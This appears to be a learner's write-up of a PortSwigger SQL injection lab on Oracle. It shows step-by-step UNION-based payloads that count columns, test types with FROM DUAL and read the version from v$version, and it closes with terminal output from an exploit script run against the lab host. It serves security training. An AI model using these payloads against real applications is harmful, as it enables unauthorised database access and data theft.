@@ -1,0 +1,49 @@
+LAB 07 - SQL injection attack, querying the database type and version on Oracle
+
+SQL Injection - Product category filter
+
+End Goal - Display the database version string
+
+Resources: 
+- SQL Injection Cheat Sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+Analysis:
+
+1. Determine number of columns
+
+Iteratively execute the following sqli payload to determine # of columns
+' ORDER BY <NUM>--
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3-- // internal server error -> 2 columns
+
+-> There are two columns
+
+2. Determine the data types of the columns
+
+' UNION SELECT 'a', 'a'-- // internal server 
+-> this must mean that it is an Oracle database (obviously, based on the lab title)
+-> based on looking at the data on the web page, we can see that the two columns are of type text,
+   but since this query outputs and error, it must be an Oracle DB which uses different syntax
+
+Looking at the "SQL Injection Cheat Sheet", we see that an Oracle SELECT statement MUST have a "FROM" clause.
+Fortunately, Oracle provides a "DUAL" table which is a special table that belongs to the schema of the user "SYS"
+but is accessible to ALL users.
+
+' UNION SELECT 'a', 'a' FROM DUAL--
+-> outputs <th>a</th> and <tr>'a'</tr> onto the page -> confirm that both columns are of type string
+
+3. Output the version of the database
+
+' UNION SELECT banner,NULL FROM v$version-- // need extra NULL column because there are two columns in the product category table
+
+Success! Lab completed.
+
+================================================================================================================================================
+Python script output:
+
+┌──(kali㉿kali)-[~/Downloads/SQL-Injection-Labs/lab-07]
+└─$ python3 sqli-lab-07.py "https://0ae4009f034db14e809121e7002e00e1.web-security-academy.net"
+[+] Dumping the version of the database...
+[+] Found the Oracle Database Version!
+[+] The Oracle database version is: Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
